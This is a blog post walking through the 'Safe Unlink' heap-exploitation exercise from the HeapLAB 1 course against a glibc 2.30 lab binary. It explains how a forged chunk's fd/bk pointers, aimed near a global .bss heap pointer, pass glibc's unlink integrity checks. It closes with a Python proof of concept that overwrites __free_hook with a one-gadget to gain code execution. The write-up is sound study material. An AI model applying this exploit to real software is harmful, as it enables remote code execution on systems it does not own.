---
layout: post
title:  "HeapLAB 1 - Safe Unlink"
date:   2022-12-07 20:01:01 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Exploitation

The modern version of the unlinking technique, `safe unlink`, is abit more complex, as mitigations were added. 

The new partial unlinking algorithm introduces 3 new integrity checks:

1. `chunksize(p) != prev_size(next_chunk(p))`

In case we control the `prev_size` of the succeeding chunk after the one that is being freed, which is in our case - this can be easily bypassed. 

2. `fd->bk != p || bk->fd != p`

This is an harsh mitigation. We have to write near the fake target addresses, `bk, fd` ptrs that points back to the chunk being freed. 

3. `p->fd_nextsize->bk_nextsize != p || p->bk_nextsize->fd_nextsize != p`

Relevant only for `largebins`. 

The example binary contains a `glibc = 2.30`, with `NX, ASLR, Full RELRO, canary`. 

There are also pointers of the heap stored at the `.bss`. \
The trick is to use these pointers, so that the `safe_unlink` checks may pass. 

As with the `unsafe unlink`, the following 2 writes would happen:

```c
*(A->bk + 0x10) = A->fd;
*(A->fd + 0x18) = A->bk;
```

Moreover, the new constraints due to the improved mitigation are (assuming the `size` check can be easily bypassed):

```c
(A->bk)->fd == A
(A->fd)->bk == A
```

Meaning:

```c
*(A->bk + 0x10) == A
*(A->fd + 0x18) == A
```

Meaning a total of 2 writes, and 2 constraints:

```c
*(A->bk + 0x10) = A->fd;
*(A->fd + 0x18) = A->bk;
*(A->bk + 0x10) == A
*(A->fd + 0x18) == A
```

Recall that the writes are only being made after the constraints have succesfully passed. \
It *DOESN'T* mean the solution must enforce the following criteria: `A->fd == A->bk == A`.

So the trick is to find addresses that holds a pointer towards the heap's chunk, `A`. \
These addresses would be overwritten. \
Note that it is actually pretty common to see global pointers towards the heap. 

On the example binary, we have `m_array`, which is a global pointer at `0x602010`, that stores the value of `A` address, `0x603000`.

In case we set `A->fd + 0x18` to the address of `m_array`, the last check would pass - because `*(0x602010) == 0x603000`. \
The same holds for `A->bk + 0x10`. \

So the two constraints are being translated to:

```c
A->bk = &m_array - 0x10
A->fd = &m_array - 0x18
```

This would result with corrupting the quadword at `&m_array` with the value of `&m_array - 0x18` (as it is being the last write), and succesfully unlinking the consolidated chunk to a wrong place. 

Important note: we must make sure that the global pointer, `m_array`, points towards the *real* chunk heap address, and not only to its `user_data` part!

In order to overcome this, recall that we control `prev_size` field of the freed chunk. \
It means we can make malloc think the free chunk actually starts 0x10 bytes after it really does!

As said, after the unlink has occured, `m_array[0] = &m_array - 0x18`. \
A simple request to write to index 0 of the array results with an overflow of the `target` address.

Full RCE POC:

```python
# Request 2 small chunks.
chunk_A = malloc(0x88)
chunk_B = malloc(0x88)

# Prepare fake chunk metadata - this setting of fd and bk is required to bypass the new mitigations
fd = elf.sym.m_array - 0x18
bk = elf.sym.m_array - 0x10
# We have to fake the previous allocated chunk size to 0x10 bytes below its original size, because m_array points at its user_content, not the chunk's start
prev_size = 0x80
# Set PREV_INUSE = 0, although the previous chunk IS allocated! this will allow the chunks consolidation
fake_size = 0x90

# Set new prev_size and size
chunk_a_prev_size = p64(0)
# Because of the size mitigation, it must match with the prev_size of the next chunk, which we set to 0x80 above
chunk_a_size = p64(0x80)  
# Note the total length of chunk_A should now appear as a total of 0x80
edit(chunk_A, chunk_a_prev_size + chunk_a_size + p64(fd) + p64(bk) + p8(0)*0x60 + p64(prev_size) + p64(fake_size))

# Trigger consolidation of chunk_A (because it is marked as not used), thus unlinking it
free(chunk_B)

# Now m_array[0] points to the .bss instead of the heap, overwrite it with our target address
edit(0, b"A" * 0x18 + p64(libc.sym.__free_hook))

# Overwrite the target data with onegadget
edit(0, p64(libc.address + 0xe1fa1))

# Trigger onegadget
free(chunk_A)
```
